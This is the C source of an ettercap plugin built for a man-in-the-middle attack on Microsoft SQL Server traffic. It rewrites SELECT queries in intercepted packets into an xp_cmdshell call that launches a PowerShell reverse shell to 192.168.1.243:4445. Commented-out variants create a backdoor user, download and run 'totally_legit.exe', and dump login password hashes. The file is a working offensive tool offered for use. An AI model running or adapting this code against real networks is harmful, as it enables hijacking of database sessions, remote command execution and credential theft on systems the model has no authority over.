#include <ec.h>
#include <ec_plugins.h>
#include <ec_hook.h>

#include <stdlib.h>
#include <string.h>

int plugin_load(void *);

static int dummy_init(void *);
static int dummy_fini(void *);
static void modify_packet(struct packet_object *po);

struct plugin_ops dummy_ops = {
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,
   /* the name of the plugin */
   .name =              "dummy",
    /* a short description of the plugin (max 50 chars) */
   .info =              "Dummy plugin modifed to mess with traffic",
   /* the plugin version. */
   .version =           "666.0",
   /* activation function */
   .init =              &dummy_init,
   /* deactivation function */
   .fini =              &dummy_fini,
};

int plugin_load(void *handle) {
   DEBUG_MSG("DUMMY: plugin_load()\n");
   return plugin_register(handle, &dummy_ops);
}

static int dummy_init(void *dummy) {
   (void) dummy;
   hook_add(HOOK_HANDLED, &modify_packet);
   USER_MSG("DUMMY: plugin running and hooked...\n");
   return PLUGIN_RUNNING;
}

static int dummy_fini(void *dummy) {
   (void) dummy;
   hook_del(HOOK_HANDLED, &modify_packet);
   USER_MSG("DUMMY: plugin finalization\n");
   return PLUGIN_FINISHED;
}

static bool is_src_or_dst_port(struct packet_object *po, u_int16 port) {
   return ntohs(po->L4.src) == port || ntohs(po->L4.dst) == port;
}

static bool is_dc_ip(struct packet_object *po) {
   //
   // UPDATE HERE: The IP of the DC you're messing with
   //
   u_int8 check_ip[4];
   check_ip[0] = 192; // 192.
   check_ip[1] = 168; // 168.
   check_ip[2] = 1;   // 1.
   check_ip[3] = 1;   // 1

   u_int32 ip_src32 = po->L3.src.addr32[0];
   u_int32 ip_dst32 = po->L3.dst.addr32[0];

   return *(u_int32*)check_ip == ip_src32 || *(u_int32*)check_ip == ip_dst32;
}

static bool is_sql_ip(struct packet_object *po) {
   //
   // UPDATE HERE: The IP of the SQL server you're messing with
   //
   u_int8 check_ip[4];
   check_ip[0] = 192; // 192.
   check_ip[1] = 168; // 168.
   check_ip[2] = 1;   // 1.
   check_ip[3] = 11;  // 11

   u_int32 ip_src32 = po->L3.src.addr32[0];
   u_int32 ip_dst32 = po->L3.dst.addr32[0];

   return *(u_int32*)check_ip == ip_src32 || *(u_int32*)check_ip == ip_dst32;
}

static void print_host_info(struct packet_object *po) {
   USER_MSG("DUMMY MODIFY TRAFFIC: %u.%u.%u.%u:%u ---> %u.%u.%u.%u:%u\n",
      po->L3.src.addr[0], po->L3.src.addr[1],
      po->L3.src.addr[2], po->L3.src.addr[3],
      ntohs(po->L4.src), po->L3.dst.addr[0],
      po->L3.dst.addr[1], po->L3.dst.addr[2],
      po->L3.dst.addr[3], ntohs(po->L4.dst));
}

static void print_buffer(char * buf, u_int32 size) {
   // Create a NULL terminated copy and print what we found
   char * print = (char*)malloc(size + 1); // +1 here adds room for a NULL byte
   memset(print, '\0', size + 1);
   memcpy(print, buf, size);
   USER_MSG("Buffer: %s\n", print);
   free(print);
}

static void replace_in_packet(u_int32 start_index, u_int32 end_index, const char * replace, u_int8 **orig) {
   u_int32 i = 0, j = 0;

   // Modify
   USER_MSG("New:    ");
   for (i = start_index, j = 0; i <= (end_index); i++, j++) {
      if (j >= strlen(replace)){
         (*orig[i]) = ' '; // Pad with spaces
      } else {
         (*orig[i]) = replace[j];
         USER_MSG("%c", (*orig[i]));
      }
   }
   USER_MSG("\n");
}

static bool find_replace(
   struct packet_object *po,
   const char *find_start,
   const char *replace,
   char *buf, u_int8 **orig,
   u_int32 ascii_chars_in_buf
) {
   char * start_ptr = strstr(buf, find_start);

   if (start_ptr) {
      print_host_info(po);

      u_int32 start_index = start_ptr - buf;
      u_int32 max_replace_len = ascii_chars_in_buf - start_index;

      if (strlen(replace) > max_replace_len) {
         USER_MSG("Cannot inject %s in this packet. Max replace length is %d which is too short. Will try on next match\n", replace, max_replace_len);
         return false;
      }

      print_buffer(start_ptr, max_replace_len);
      replace_in_packet(start_index, ascii_chars_in_buf - 1, replace, orig);

      USER_MSG("Replaced!\n");
      return true;
   }

   return false;
}

static bool do_sql_stuff(struct packet_object *po) {
   u_int32 i = 0, j = 0, ascii_data_len = 0;
   bool modified = false;

   // A buffer to store only ASCII chars b/w 32 and 126 from the packet data
   char * buf = (char*)malloc(po->DATA.len + 1); // Add 1 in case the entire packet data is ASCII. We want a NULL terminated str.

   // An array of u_int8 pointers that will store the address of the byte
   // in the packet data that corresponds with the ASCII byte in buf so we
   // can modify the packet data later
   u_int8 ** orig = malloc(sizeof(u_int8*) * po->DATA.len);

   // Fill arrays with NULL
   memset(orig, '\0', po->DATA.len);
   memset(buf, '\0', po->DATA.len + 1);

   // Get all the ASCII chars
   for (i = 0; i < po->DATA.len; i++) {
      // ASCII range I care about b/w 32 and 126 inclusive
      if ((u_int8)po->DATA.data[i] >= 32 && (u_int8)po->DATA.data[i] <= 126) {
         buf[j] = po->DATA.data[i];    // Add ASCII char to buf
	 orig[j] = &po->DATA.data[i];  // Add address of byte to modify to orig at the same index
         j++;
      }
   }
   ascii_data_len = j;

   //*******************SQL STUFF********************
   // Search for this so we know we can replace data
   static const char * search_sql = "SELECT";

   // SQL commands to inject
   static const char * cmds[1] = {
      //"EXEC sp_configure 'xp_cmdshell',1;",
      "EXEC master..xp_cmdshell 'powershell -c \"$s=(New-Object Net.Sockets.TCPClient(\"\"\"192.168.1.243\"\"\",4445)).GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$t=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($t,0,$t.Length)}\"'"
      //"EXEC master..xp_cmdshell 'C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -c \"$s=(New-Object Net.Sockets.TCPClient(\"\"\"192.168.1.243\"\"\",4445)).GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$t=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($t,0,$t.Length)}\"'",
      //"EXEC master..xp_cmdshell 'net user /add ais hackme4fun'",
      //"EXEC master..xp_cmdshell 'powershell -c \"cp \\\\192.168.1.241\\dcgs_18_1\\totally_legit.exe C:\\Windows\\Temp;C:\\Windows\\Temp\\totally_legit.exe\"'",
      //"EXEC master..xp_cmdshell 'powershell -command \"ipmo bitstransfer;start-bitstransfer http://192.168.1.243/totally_legit.exe -destination C:\\Windows\\Temp;C:\\Windows\\Temp\\totally_legit.exe\"'",
      //"SELECT user_name();\nCommit Transaction;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\nEXEC master..xp_cmdshell 'net user';",
      //"SELECT * FROM openquery(perfwareLS, 'Exec sp_configure ''xp_cmdshell'', ''1''');",
      //"EXEC perfwareLS.master.dbo.sp_executesql N'Exec sp_configure \"xp_cmdshell\", \"1\"';\nEXEC perfwareLS.master.dbo.sp_executesql N'RECONFIGURE';",
      //"EXEC master..xp_cmdshell 'net user';"
      //"RECONFIGURE;",
      //"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;",
      //"EXEC master..xp_cmdshell 'net user';"
      //"EXEC xp_msver;",
      //"SELECT @@version;",
      //"SELECT user_name();",
      //"SELECT DB_NAME();",
      //"SELECT HOST_NAME();",
      //"SELECT name FROM master..syslogins;",
      //"SELECT name FROM master..sysobjects WHERE xtype='U';",
      //"SELECT name FROM master..sysdatabases;",
      //"SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');",
      //"SELECT name FROM master.sys.sql_logins;",
      //"SELECT password_hash FROM master.sys.sql_logins;"
   };
   static const u_int32 num_commands = 1; // Number of commands to run
   static u_int32 current_command = 0; // Current index into the cmds array

   if (current_command < num_commands) {
      // Execute the current command
      if (find_replace(po, search_sql, cmds[current_command], buf, orig, ascii_data_len)) {
         current_command += 1;
         modified = true;
      }
   } else {
      // Once all the commands execute, run this on each replace
      if (find_replace(po, search_sql, cmds[0], buf, orig, ascii_data_len)) {
         modified = true;
      }
   }

   // Cleanup
   free(orig);
   free(buf);

   return modified;
}

static bool do_dc_stuff(struct packet_object *po) {
   return false;
}

void modify_packet(struct packet_object *po)
{
   bool modified = false;

   // Don't modify packets that won't be forwarded
   if (!(po->flags & PO_FORWARDABLE))
      return;

   // We only care about traffic on port 1433 or 389 for our LDAP and SQL manipulations
   if (!is_src_or_dst_port(po, 1433) && !is_src_or_dst_port(po, 389))
      return;

   // Only care about IP of the SQL server in the source or dest
   if (is_sql_ip(po)) {
      modified = do_sql_stuff(po);
   } else if (is_dc_ip(po)) {
      modified = do_dc_stuff(po);
   }

   if (modified) {
      // Triggers ettercap to recalculate checksum b/c we messed with the packet
      po->flags |= PO_MODIFIED;
   }
}

/* EOF */

// vim:ts=3:expandtab
